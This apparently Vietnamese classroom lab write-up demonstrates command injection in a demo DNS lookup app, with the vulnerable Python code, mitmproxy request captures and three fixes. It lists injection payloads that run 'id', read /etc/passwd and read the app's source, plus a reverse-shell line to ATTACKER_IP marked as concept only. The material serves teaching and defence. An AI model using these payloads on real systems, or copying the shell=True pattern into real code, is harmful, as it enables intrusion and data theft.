# Demo Lab — Command Injection (DNS Lookup Tool)

> Standalone demo app, viết riêng để trình bày — không nằm trong code của
> thầy. Cùng lỗi gốc với Lab 08 (`/ping`), khác bề mặt: đây là chức năng
> **DNS Lookup**, gọi `host` (Linux) thay vì `ping`.

## 📖 Explanation

**Command Injection** cho phép kẻ tấn công chạy lệnh hệ điều hành tùy ý,
bằng cách chèn thêm lệnh vào một chuỗi lệnh mà server đưa thẳng cho shell.

Khi dữ liệu người dùng được ghép vào chuỗi lệnh shell mà không qua kiểm
tra, các ký tự đặc biệt của shell (`;`, `|`, `&&`, `$(...)`, backtick) cho
phép kẻ tấn công nối thêm hoặc thay thế lệnh của riêng mình.

### Đoạn code lỗi (`app.py`)

```python
DNS_CMD = "nslookup" if os.name == "nt" else "host"

output = subprocess.check_output(
    f"{DNS_CMD} {domain}",   # (A) ghép chuỗi — domain nằm trong văn bản lệnh
    shell=True,                # (B) đưa cho shell (/bin/sh) tự đọc và diễn giải
    stderr=subprocess.STDOUT,
    timeout=10,
)
```

`shell=True` kết hợp f-string khiến shell đọc **toàn bộ chuỗi**, bao gồm
mọi toán tử mà kẻ tấn công chèn vào `domain`.

---

## 🎯 Try It

Mở `http://127.0.0.1:15001/dns` (không cần đăng nhập — app demo này không
có hệ thống tài khoản, tập trung đúng vào command injection).

### 1. Hành vi bình thường

Nhập `example.com` → nhận kết quả DNS thật (địa chỉ IPv4/IPv6, mail
server...).

### 2. Injection cơ bản — dấu chấm phẩy

Nhập: `example.com; id`

Lệnh thực thi thật sự trở thành:

```bash
host example.com; id
```

`id` chạy ngay sau khi `host` xong — bạn sẽ thấy UID của user đang chạy
server.

### 3. Pipe injection

Nhập: `example.com | whoami`

```bash
host example.com | whoami
```

Output của `host` bị "nuốt" vào làm input cho `whoami` — chỉ thấy tên
user.

### 4. Subshell injection

Nhập: `$(cat /etc/passwd | head -5)`

```bash
host $(cat /etc/passwd | head -5)
```

Shell chạy phần trong `$(...)` trước, dùng kết quả làm tham số cho
`host`. Nội dung `/etc/passwd` lộ ra trong thông báo lỗi "host không phân
giải được".

### 5. Đọc mã nguồn của chính app

Nhập:
```
example.com; cat /home/ly_tran_gia_khang/is/web/dns-demo/app.py
```

Thấy nguyên văn đoạn code lỗi ở trên — bằng chứng trực quan nhất.

### 6. Reverse shell (chỉ nêu khái niệm — KHÔNG chạy thật)

```bash
example.com; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

> ⚠️ Lệnh này mở shell điều khiển từ xa. Chỉ nhắc tới bằng lời khi thuyết
> trình, tuyệt đối không thực thi trước lớp.

---

## 🔍 Packet Inspection with mitmproxy

### Request bình thường

```http
POST /dns HTTP/1.1
Host: 127.0.0.1:15001
Content-Type: application/x-www-form-urlencoded

domain=example.com
```

### Request bị injection

```http
POST /dns HTTP/1.1
Host: 127.0.0.1:15001

domain=example.com%3B+id
```

`%3B` là `;` đã mã hóa URL. Body giải mã: `domain=example.com; id`.

### Response

```http
HTTP/1.1 200 OK

example.com has address 93.184.216.34
...
uid=1000(ly_tran_gia_khang) gid=1000(ly_tran_gia_khang) groups=...
```

`uid=1000` xuất hiện trong thứ lẽ ra chỉ là kết quả DNS — đây là bằng
chứng rõ ràng nhất. **Status code vẫn là `200 OK` bình thường** — không
có gì bất thường ở tầng HTTP, dù dữ liệu bên trong đã bị khai thác.

### Chạy mitmweb

```bash
cd /home/ly_tran_gia_khang/is/web
/home/ly_tran_gia_khang/.local/bin/uv run mitmweb -s mitm_addon.py \
    --listen-host 127.0.0.1 --listen-port 18080 --set web_port=18081
```

Cấu hình trình duyệt dùng proxy `127.0.0.1:18080` (nhớ thêm
`--proxy-bypass-list="<-loopback>"` khi mở Chrome, nếu không Chrome sẽ tự
bỏ qua proxy cho `127.0.0.1`).

---

## 🛡️ Hardening

### Fix 1 — Không dùng `shell=True`, truyền list argument

```python
subprocess.check_output(
    [DNS_CMD, domain],
    shell=False,
    stderr=subprocess.STDOUT,
    timeout=10,
)
```

`domain` trở thành **một tham số duy nhất**, không ai diễn giải `;`, `|`
là cú pháp nữa.

### Fix 2 — Whitelist định dạng domain

```python
import re
if not re.fullmatch(r"[a-zA-Z0-9.-]+", domain):
    output = f"Invalid domain: {domain!r}"
```

Dùng `re.fullmatch` (không phải `re.match`) để chắc chắn **toàn bộ**
chuỗi phải khớp định dạng, tránh lọt ký tự thừa ở cuối.

### Fix 3 — Dùng thư viện, không gọi shell

```python
import socket
try:
    ip = socket.gethostbyname(domain)
    output = f"{domain} resolves to {ip}"
except socket.gaierror:
    output = f"Could not resolve {domain}"
```

Phân giải DNS ngay trong Python, không cần gọi chương trình ngoài nào cả
— loại bỏ hoàn toàn bề mặt tấn công.

### Key takeaway

> Tránh `shell=True` bất cứ khi nào có thể. Truyền tham số dạng **list**
> để shell không còn cơ hội diễn giải ký tự đặc biệt — giữ **dữ liệu**
> của người dùng tách biệt khỏi **mã lệnh** của hệ thống.
